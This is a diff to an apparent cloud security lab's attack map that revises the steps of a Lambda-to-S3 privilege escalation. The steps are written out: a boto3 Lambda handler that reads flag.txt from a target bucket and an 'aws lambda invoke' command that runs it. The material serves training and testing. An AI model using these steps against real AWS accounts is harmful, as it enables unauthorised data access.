@@ -73,13 +73,14 @@ attackMap:
       commands:
         - description: "Create the Lambda function payload that reads the flag from S3"
           command: |
-            cat > /tmp/lambda_payload.py << 'EOF'
+            TARGET_BUCKET=<paste the target_bucket_name output here>
+            cat > /tmp/lambda_payload.py << EOF
             import boto3
             import json
             import os
             def handler(event, context):
                 s3 = boto3.client('s3')
-                bucket = event.get('bucket')
+                bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
                 obj = s3.get_object(Bucket=bucket, Key='flag.txt')
                 flag = obj['Body'].read().decode('utf-8')
                 return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
@@ -111,7 +112,7 @@ attackMap:
       hints: []
       commands:
         - description: "Invoke the Lambda function to read the flag from S3"
-          command: 'TARGET_BUCKET=<paste the target_bucket_name output here> && aws lambda invoke --function-name pl-lambda-006-to-bucket-escalation --payload "{\"bucket\": \"${TARGET_BUCKET}\"}" /tmp/lambda_output.json && cat /tmp/lambda_output.json'
+          command: "aws lambda invoke --function-name pl-lambda-006-to-bucket-escalation --payload '{}' /tmp/lambda_output.json && cat /tmp/lambda_output.json"
 
     - from: target-role
       to: target-bucket
